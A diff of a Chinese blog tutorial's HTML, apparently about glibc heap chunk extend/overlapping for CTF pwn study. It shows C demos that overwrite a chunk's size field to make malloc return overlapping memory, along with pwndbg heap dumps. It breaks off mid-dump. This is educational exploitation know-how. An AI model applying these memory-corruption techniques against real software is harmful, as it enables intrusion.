+<p>没有问题,下一步进行size的改写,至于为什么是chunk-8呢,因为我们知道chunk给我们的地址其实是mem的地址,也就是0x602010处,因此减8可以到pre_size处<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>这里已经改写成功了,此时的heap分析出来的是这样的:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  bk = <span class="hljs-number">0x6666666666663778</span>,<br>  fd_nextsize = <span class="hljs-number">0xa3836356566</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602450</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134065</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>成功通过size欺骗到了ptmalloc机制<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">14</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x303a7274705d2a5b      <span class="hljs-number">0</span>x66666<span class="hljs-number">66666663778</span><br><span class="hljs-number">0x602060</span>:       <span class="hljs-number">0</span>x00000a<span class="hljs-number">3836356566</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure></p>
+<p>然后我们让程序到下一个分配<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  bk = <span class="hljs-number">0x6666666666663778</span>,<br>  fd_nextsize = <span class="hljs-number">0xa3836356566</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602450</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134065</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>此时这里虽然没变,但是<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; p/x ptr1<br><span class="hljs-meta"><span class="hljs-meta-keyword">$4</span> = 0x602010</span><br></code></pre></td></tr></table></figure></p>
 <p>也就是说我们成功分配了free掉的chunk1</p>
-<p>程序运行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╰─# ./fast_in</span><br><span class="line">[*]ptr:0x180e010</span><br><span class="line">[*]ptr1:0x180e010</span><br></pre></td></tr></table></figure></p>
+<p>程序运行结果:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">╰─# ./<span class="hljs-selector-tag">fast_in</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr</span><span class="hljs-selector-pseudo">:0x180e010</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr1</span><span class="hljs-selector-pseudo">:0x180e010</span><br></code></pre></td></tr></table></figure></p>
 <ol start="2">
 <li>smallbin</li>
 </ol>
-<p>代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x80);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    *(long long  *)((long long)ptr-0x8)=0xb1;</span><br><span class="line">   // printf(&quot;[*]%p\n&quot;,&amp;ptr);</span><br><span class="line">    printf(&quot;[*]%p\n&quot;,ptr);</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(0xa0);</span><br><span class="line">    printf(&quot;[*]%p\n&quot;,ptr1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>程序运行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╰─# ./pwn</span><br><span class="line">[*]0x7a3010</span><br><span class="line">[*]0x7a3010</span><br></pre></td></tr></table></figure></p>
+<p>代码如下:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-keyword">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>  *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>   <span class="hljs-comment">// printf("[*]%p\n",&amp;ptr);</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]%p\n"</span>,ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]%p\n"</span>,ptr1);<br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>程序运行结果:<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">╰─<span class="hljs-meta"># ./pwn</span><br>[<span class="hljs-meta">*</span>]<span class="hljs-number">0x7a3010</span><br>[<span class="hljs-meta">*</span>]<span class="hljs-number">0x7a3010</span><br></code></pre></td></tr></table></figure></p>
 <p>这个程序就不做深入分析了,和fastbin的一样</p>
-<h3 id="free状态下"><a href="#free状态下" class="headerlink" title="free状态下"></a>free状态下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x80);//分配第一个0x80的chunk1</span><br><span class="line">    malloc(0x10);//分配第二个0x10的chunk2</span><br><span class="line">    printf(&quot;[*]ptr:%p\n&quot;,ptr);</span><br><span class="line">    free(ptr);//首先进行释放，使得chunk1进入unsorted bin</span><br><span class="line"></span><br><span class="line">    *(long long *)((long long)ptr-0x8)=0xb1;</span><br><span class="line">    ptr1=malloc(0xa0);</span><br><span class="line">    printf(&quot;[*]ptr:%p\n&quot;,ptr1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>程序运行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╰─# ./pwn</span><br><span class="line">[*]ptr:0x149b010</span><br><span class="line">[*]ptr:0x149b010</span><br></pre></td></tr></table></figure></p>
+<h3 id="free状态下"><a href="#free状态下" class="headerlink" title="free状态下"></a>free状态下</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-keyword">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个0x80的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk2</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr:%p\n"</span>,ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//首先进行释放，使得chunk1进入unsorted bin</span><br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr:%p\n"</span>,ptr1);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>程序运行结果:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">╰─# ./<span class="hljs-selector-tag">pwn</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr</span><span class="hljs-selector-pseudo">:0x149b010</span><br><span class="hljs-selector-attr">[*]</span><span class="hljs-selector-tag">ptr</span><span class="hljs-selector-pseudo">:0x149b010</span><br></code></pre></td></tr></table></figure></p>
 <p>这个就是先释放,然后才进行大小的更改</p>
-<h3 id="通过extend后向overlapping"><a href="#通过extend后向overlapping" class="headerlink" title="通过extend后向overlapping"></a>通过extend后向overlapping</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x10);//分配第1个 0x80 的chunk1</span><br><span class="line">    malloc(0x10); //分配第2个 0x10 的chunk2</span><br><span class="line">    malloc(0x10); //分配第3个 0x10 的chunk3</span><br><span class="line">    malloc(0x10); //分配第4个 0x10 的chunk4    </span><br><span class="line">    printf(&quot;[*]ptr:%p\n&quot;,ptr);</span><br><span class="line">    *(long long *)((long long)ptr-0x8)=0x61;</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(0x50);</span><br><span class="line">    printf(&quot;[*]ptr:%p\n&quot;,ptr1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我在第一次分配处下了断点,此时的堆:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x602020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 135137,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>随后分配完全结束时我们再看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602060 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x20f81</span><br><span class="line">&#125;</span><br><span class="line">0x602080 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 135041,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这时:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       0x0000000000000000      0x0000000000020f81</span><br><span class="line">0x602090:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
-<p>随后我们更改了size的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 97,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602060 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x411</span><br><span class="line">&#125;</span><br><span class="line">0x602080 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1041,</span><br><span class="line">  fd = 0x303a7274705d2a5b,</span><br><span class="line">  bk = 0xa30313032303678,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602490 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134001,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>free之后我们可以看到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 97,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602060 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x411</span><br><span class="line">&#125;</span><br><span class="line">0x602080 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1041,</span><br><span class="line">  fd = 0x303a7274705d2a5b,</span><br><span class="line">  bk = 0xa30313032303678,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602490 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134001,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>再分配一次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 97,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602060 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x411</span><br><span class="line">&#125;</span><br><span class="line">0x602080 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1041,</span><br><span class="line">  fd = 0x303a7274705d2a5b,</span><br><span class="line">  bk = 0xa30313032303678,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602490 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134001,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>此时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000061</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       